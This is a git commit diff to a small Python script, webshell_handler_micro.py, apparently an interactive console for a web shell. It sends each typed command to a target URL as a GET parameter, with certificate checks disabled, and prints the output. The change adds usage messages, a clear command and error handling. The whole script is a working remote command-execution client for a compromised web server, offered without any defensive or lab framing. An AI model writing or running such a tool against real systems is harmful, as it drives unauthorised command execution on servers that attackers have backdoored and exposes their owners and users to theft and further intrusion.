a6527340fff624cdcafbf4495ec9effc6cb016e9
Piotr Gaszczynski <piotrek.gaszczynski@gmail.com>
2026-03-17 19:14:12 +0100

    Change micro handler

--- webshell_handler_micro.py
+++ webshell_handler_micro.py
@@ -16,15 +16,29 @@ urllib3.disable_warnings() # type: ignore
 
 try:
     url, param = sys.argv[1:3]
+except ValueError:
+    print("Usage: python3 webshell_handler_micro.py <url> <param>")
+    sys.exit(1)
 
+try:
     while True:
-            cmd = input("webshell> ").strip()
+            cmd = input("\nwebshell> ").strip()
             if not cmd:
+                continue
+            if cmd in ["clear", "cls"]:
+                print("\033c", end="")
                 continue
             if cmd == "exit":
                 break
-            
-            print(requests.get(url, params={param: cmd}, verify=False, timeout=20).text.strip())
 
+            print(f"\n{requests.get(url, params={param: cmd}, verify=False, timeout=20).text.strip()}")
+
+except requests.RequestException as e:
+    print(f"\nRequestException: {e}")
+    sys.exit(1)
+except KeyboardInterrupt as e:
+    print(f"\nKeyboardInterrupt: {e}")
+    sys.exit(0)
 except Exception as e:
-    print(f"Exception: {e}")
+    print(f"\nException: {e}")
+    sys.exit(1)
